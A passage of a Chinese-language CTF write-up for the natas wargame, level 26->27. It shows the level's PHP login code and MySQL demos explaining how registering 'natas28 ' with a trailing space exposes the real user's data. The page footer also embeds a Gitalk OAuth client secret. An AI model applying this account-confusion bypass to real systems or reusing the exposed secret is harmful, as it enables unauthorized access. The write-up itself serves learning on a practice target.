+    <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>mysql_num_rows</span>($res) <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0</span>){
+        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>True</span>;
+    }
+    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>;
+}
+
+
+<span style=color:#66d9ef>function</span> <span style=color:#a6e22e>validUser</span>($link,$usr){
+    
+    $user<span style=color:#f92672>=</span><span style=color:#a6e22e>mysql_real_escape_string</span>($usr);
+    
+    $query <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;SELECT * from users where username=&#39;</span><span style=color:#e6db74>$user</span><span style=color:#e6db74>&#39;&#34;</span>;
+    $res <span style=color:#f92672>=</span> <span style=color:#a6e22e>mysql_query</span>($query, $link);
+    <span style=color:#66d9ef>if</span>($res) {
+        <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>mysql_num_rows</span>($res) <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0</span>) {
+            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>True</span>;
+        }
+    }
+    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>;
+}
+
+
+<span style=color:#66d9ef>function</span> <span style=color:#a6e22e>dumpData</span>($link,$usr){
+    
+    $user<span style=color:#f92672>=</span><span style=color:#a6e22e>mysql_real_escape_string</span>($usr);
+    
+    $query <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;SELECT * from users where username=&#39;</span><span style=color:#e6db74>$user</span><span style=color:#e6db74>&#39;&#34;</span>;
+    $res <span style=color:#f92672>=</span> <span style=color:#a6e22e>mysql_query</span>($query, $link);
+    <span style=color:#66d9ef>if</span>($res) {
+        <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>mysql_num_rows</span>($res) <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0</span>) {
+            <span style=color:#66d9ef>while</span> ($row <span style=color:#f92672>=</span> <span style=color:#a6e22e>mysql_fetch_assoc</span>($res)) {
+                <span style=color:#75715e>// thanks to Gobo for reporting this bug!  
+</span><span style=color:#75715e></span>                <span style=color:#75715e>//return print_r($row);
+</span><span style=color:#75715e></span>                <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>print_r</span>($row,<span style=color:#66d9ef>true</span>);
+            }
+        }
+    }
+    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>;
+}
+
+
+<span style=color:#66d9ef>function</span> <span style=color:#a6e22e>createUser</span>($link, $usr, $pass){
+
+    $user<span style=color:#f92672>=</span><span style=color:#a6e22e>mysql_real_escape_string</span>($usr);
+    $password<span style=color:#f92672>=</span><span style=color:#a6e22e>mysql_real_escape_string</span>($pass);
+    
+    $query <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;INSERT INTO users (username,password) values (&#39;</span><span style=color:#e6db74>$user</span><span style=color:#e6db74>&#39;,&#39;</span><span style=color:#e6db74>$password</span><span style=color:#e6db74>&#39;)&#34;</span>;
+    $res <span style=color:#f92672>=</span> <span style=color:#a6e22e>mysql_query</span>($query, $link);
+    <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>mysql_affected_rows</span>() <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0</span>){
+        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>True</span>;
+    }
+    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>;
+}
+
+
+<span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>array_key_exists</span>(<span style=color:#e6db74>&#34;username&#34;</span>, $_REQUEST) <span style=color:#66d9ef>and</span> <span style=color:#a6e22e>array_key_exists</span>(<span style=color:#e6db74>&#34;password&#34;</span>, $_REQUEST)) {
+    $link <span style=color:#f92672>=</span> <span style=color:#a6e22e>mysql_connect</span>(<span style=color:#e6db74>&#39;localhost&#39;</span>, <span style=color:#e6db74>&#39;natas27&#39;</span>, <span style=color:#e6db74>&#39;&lt;censored&gt;&#39;</span>);
+    <span style=color:#a6e22e>mysql_select_db</span>(<span style=color:#e6db74>&#39;natas27&#39;</span>, $link);
+   
+
+    <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>validUser</span>($link,$_REQUEST[<span style=color:#e6db74>&#34;username&#34;</span>])) {
+        <span style=color:#75715e>//user exists, check creds
+</span><span style=color:#75715e></span>        <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>checkCredentials</span>($link,$_REQUEST[<span style=color:#e6db74>&#34;username&#34;</span>],$_REQUEST[<span style=color:#e6db74>&#34;password&#34;</span>])){
+            <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;Welcome &#34;</span> <span style=color:#f92672>.</span> <span style=color:#a6e22e>htmlentities</span>($_REQUEST[<span style=color:#e6db74>&#34;username&#34;</span>]) <span style=color:#f92672>.</span> <span style=color:#e6db74>&#34;!&lt;br&gt;&#34;</span>;
+            <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;Here is your data:&lt;br&gt;&#34;</span>;
+            $data<span style=color:#f92672>=</span><span style=color:#a6e22e>dumpData</span>($link,$_REQUEST[<span style=color:#e6db74>&#34;username&#34;</span>]);
+            <span style=color:#66d9ef>print</span> <span style=color:#a6e22e>htmlentities</span>($data);
+        }
+        <span style=color:#66d9ef>else</span>{
+            <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;Wrong password for user: &#34;</span> <span style=color:#f92672>.</span> <span style=color:#a6e22e>htmlentities</span>($_REQUEST[<span style=color:#e6db74>&#34;username&#34;</span>]) <span style=color:#f92672>.</span> <span style=color:#e6db74>&#34;&lt;br&gt;&#34;</span>;
+        }        
+    } 
+    <span style=color:#66d9ef>else</span> {
+        <span style=color:#75715e>//user doesn&#39;t exist
+</span><span style=color:#75715e></span>        <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>createUser</span>($link,$_REQUEST[<span style=color:#e6db74>&#34;username&#34;</span>],$_REQUEST[<span style=color:#e6db74>&#34;password&#34;</span>])){ 
+            <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;User &#34;</span> <span style=color:#f92672>.</span> <span style=color:#a6e22e>htmlentities</span>($_REQUEST[<span style=color:#e6db74>&#34;username&#34;</span>]) <span style=color:#f92672>.</span> <span style=color:#e6db74>&#34; was created!&#34;</span>;
+        }
+    }
+
+    <span style=color:#a6e22e>mysql_close</span>($link);
+} <span style=color:#66d9ef>else</span> {
+<span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span></code></pre></div><p>又到了对数据库操作，理一下逻辑，首先检测输入的 username 是否存在，存在的话继续验证 username 和 password 是否正确，正确的话会显示用户的信息，不正确就会报错；如果 username 不存在，就会创建该用户。
+自然我们是不知道正确的密码的，所以这里应该是sql注入，但是这里有一个 <strong>mysql_real_escape_string</strong> 函数就比较麻烦了；参考其他师傅的wp才知道用到另一个知识点。
+首先创建这样一张表：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql>mysql<span style=color:#f92672>&gt;</span> <span style=color:#66d9ef>desc</span> test;
+<span style=color:#f92672>+</span><span style=color:#75715e>-------+------------+------+-----+---------+-------+
+</span><span style=color:#75715e></span><span style=color:#f92672>|</span> Field <span style=color:#f92672>|</span> <span style=color:#66d9ef>Type</span>       <span style=color:#f92672>|</span> <span style=color:#66d9ef>Null</span> <span style=color:#f92672>|</span> <span style=color:#66d9ef>Key</span> <span style=color:#f92672>|</span> <span style=color:#66d9ef>Default</span> <span style=color:#f92672>|</span> Extra <span style=color:#f92672>|</span>
+<span style=color:#f92672>+</span><span style=color:#75715e>-------+------------+------+-----+---------+-------+
+</span><span style=color:#75715e></span><span style=color:#f92672>|</span> <span style=color:#66d9ef>user</span>  <span style=color:#f92672>|</span> varchar(<span style=color:#ae81ff>5</span>) <span style=color:#f92672>|</span> YES  <span style=color:#f92672>|</span>     <span style=color:#f92672>|</span> <span style=color:#66d9ef>NULL</span>    <span style=color:#f92672>|</span>       <span style=color:#f92672>|</span>
+<span style=color:#f92672>|</span> pass  <span style=color:#f92672>|</span> varchar(<span style=color:#ae81ff>5</span>) <span style=color:#f92672>|</span> YES  <span style=color:#f92672>|</span>     <span style=color:#f92672>|</span> <span style=color:#66d9ef>NULL</span>    <span style=color:#f92672>|</span>       <span style=color:#f92672>|</span>
+<span style=color:#f92672>+</span><span style=color:#75715e>-------+------------+------+-----+---------+-------+
+</span></code></pre></div><p>向其中插入两个用户：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql>mysql<span style=color:#f92672>&gt;</span> <span style=color:#66d9ef>insert</span> <span style=color:#66d9ef>into</span> test <span style=color:#66d9ef>values</span>(<span style=color:#e6db74>&#39;test&#39;</span>,<span style=color:#e6db74>&#39;pass1&#39;</span>);
+mysql<span style=color:#f92672>&gt;</span> <span style=color:#66d9ef>insert</span> <span style=color:#66d9ef>into</span> test <span style=color:#66d9ef>values</span>(<span style=color:#e6db74>&#39;test &#39;</span>,<span style=color:#e6db74>&#39;pass2&#39;</span>);
+</code></pre></div><p>两者的区别在于后一个是有空格的。接下来尝试按名称查询一下：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql>mysql<span style=color:#f92672>&gt;</span> <span style=color:#66d9ef>select</span> <span style=color:#f92672>*</span> <span style=color:#66d9ef>from</span> test <span style=color:#66d9ef>where</span> <span style=color:#66d9ef>user</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#39;test&#39;</span>;
+<span style=color:#f92672>+</span><span style=color:#75715e>-------+-------+
+</span><span style=color:#75715e></span><span style=color:#f92672>|</span> <span style=color:#66d9ef>user</span>  <span style=color:#f92672>|</span> pass  <span style=color:#f92672>|</span>
+<span style=color:#f92672>+</span><span style=color:#75715e>-------+-------+
+</span><span style=color:#75715e></span><span style=color:#f92672>|</span> test  <span style=color:#f92672>|</span> pass1 <span style=color:#f92672>|</span>
+<span style=color:#f92672>|</span> test  <span style=color:#f92672>|</span> pass2 <span style=color:#f92672>|</span>
+<span style=color:#f92672>+</span><span style=color:#75715e>-------+-------+
+</span></code></pre></div><p>可以看到，查询的条件中并没有空格，但是两个用户都被查询出来了。但是这里还有更神奇的事：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql>mysql<span style=color:#f92672>&gt;</span> <span style=color:#66d9ef>select</span> <span style=color:#66d9ef>user</span>, <span style=color:#66d9ef>length</span>(<span style=color:#66d9ef>user</span>) <span style=color:#66d9ef>from</span> test;
+<span style=color:#f92672>+</span><span style=color:#75715e>-------+--------------+
+</span><span style=color:#75715e></span><span style=color:#f92672>|</span> <span style=color:#66d9ef>user</span>  <span style=color:#f92672>|</span> <span style=color:#66d9ef>length</span>(<span style=color:#66d9ef>user</span>) <span style=color:#f92672>|</span>
+<span style=color:#f92672>+</span><span style=color:#75715e>-------+--------------+
+</span><span style=color:#75715e></span><span style=color:#f92672>|</span> test  <span style=color:#f92672>|</span>            <span style=color:#ae81ff>4</span> <span style=color:#f92672>|</span>
+<span style=color:#f92672>|</span> test  <span style=color:#f92672>|</span>            <span style=color:#ae81ff>5</span> <span style=color:#f92672>|</span>
+<span style=color:#f92672>+</span><span style=color:#75715e>-------+--------------+
+</span></code></pre></div><p>这道题就是利用了这一点。因为这道题是可以创建用户的，所以如果我输入一个 <code>natas28 </code>(加上空格)，使这个 username 被创建，然后我们一个这用户登录，那么在调用 <em>dumpData</em> 的时候真正的 natas28 也可以被显示出来，这样我们的目的就达到了。
+<img src=https://causality-hugo.oss-cn-hangzhou.aliyuncs.com/security/writeup/natas/natas27.png alt=natas27>
+成功创建了这个用户。
+<img src=https://causality-hugo.oss-cn-hangzhou.aliyuncs.com/security/writeup/natas/natas27-2.png alt=natas27-2></p>
+</article>
+<div class="flex justify-between mt-12 mx-8 font-title text-xl">
+<div class=flex-initial>
+<a href=https://causality.top/misc/tech/mirrors/ class=hover:text-blue-200>上一篇：各种镜像配置笔记</a>
+</div>
+<div class=flex-initial>
+<a href=https://causality.top/security/writeup/mrctf/ class=hover:text-blue-200>下一篇：MRCTF Web 部分题解</a>
+</div>
+</div>
+<link rel=stylesheet href=https://unpkg.com/gitalk/dist/gitalk.css>
+<script src=https://unpkg.com/gitalk/dist/gitalk.min.js></script>
+<div id=gitalk></div>
+<script>var gitalk=new Gitalk({clientID:'9a04c6b451fbce76511d',clientSecret:'430c540c77ecd6b59749c60f0341c057bd5320a0',repo:'Causa1ity.github.io',owner:'Causa1ity',admin:'Causa1ity',id:'security/writeup/natas',distractionFreeMode:!1});gitalk.render('gitalk')</script>
+</div>
+<div class="flex-initial hidden lg:block ml-4 mr-auto">
+<div class=fixed>
+<div class=font-serif>
+<nav id=TableOfContents>
+<ul>
+<li><a href=#level-0>Level 0:</a></li>
+<li><a href=#level-0-1>Level 0->1:</a></li>
+<li><a href=#level-1-2>Level 1->2：</a></li>
+<li><a href=#level-2-3>Level 2->3:</a></li>
+<li><a href=#level-3-4>Level 3->4:</a></li>
+<li><a href=#level-4-5>Level 4->5:</a></li>
+<li><a href=#level-5-6>Level 5->6:</a></li>
+<li><a href=#level-6-7>Level 6->7:</a></li>
+</ul>
+<ul>
+<li><a href=#level-7-8>Level 7->8:</a></li>
+<li><a href=#level-8-9>Level 8-9：</a></li>
+<li><a href=#level-9-10>Level 9->10:</a></li>
+<li><a href=#level-10-11>Level 10->11:</a></li>
+</ul>
+<ul>
+<li><a href=#level-11-12>Level 11->12：</a></li>
+<li><a href=#level-12-13>Level 12->13:</a></li>
+<li><a href=#level-13-14>Level 13->14:</a></li>
+<li><a href=#level-14-15>Level 14->15:</a></li>
+<li><a href=#level-15-16>Level 15->16:</a></li>
+<li><a href=#level-16-17>Level 16->17:</a></li>
+</ul>
+<ul>
+<li><a href=#level-17-18>Level 17->18:</a></li>
+<li><a href=#level-18-19>Level 18->19:</a></li>
+<li><a href=#level-19-20>Level 19->20:</a></li>
+<li><a href=#level-20-21>Level 20->21:</a></li>
+<li><a href=#level-21-22>Level 21->22:</a></li>
+</ul>
+<ul>
+<li><a href=#level-22-23>Level 22->23:</a></li>
+<li><a href=#level-23-24>Level 23->24:</a></li>
+<li><a href=#level-24-25>Level 24->25：</a></li>
+<li><a href=#level-25-26>Level 25->26：</a></li>
+</ul>
+<ul>
+<li><a href=#level-26-27>Level 26->27:</a></li>
+</ul>
+</nav>
+</div>
+</div>
+</div>
+</div>
+</div>
+<footer class=flex-auto><div class="font-title text-center my-4">
+<p class=text-lg>
+Powered By <a href=https://gohugo.io>Hugo</a>
+</p>
+</div>
+</footer>
+</body>
+</html>
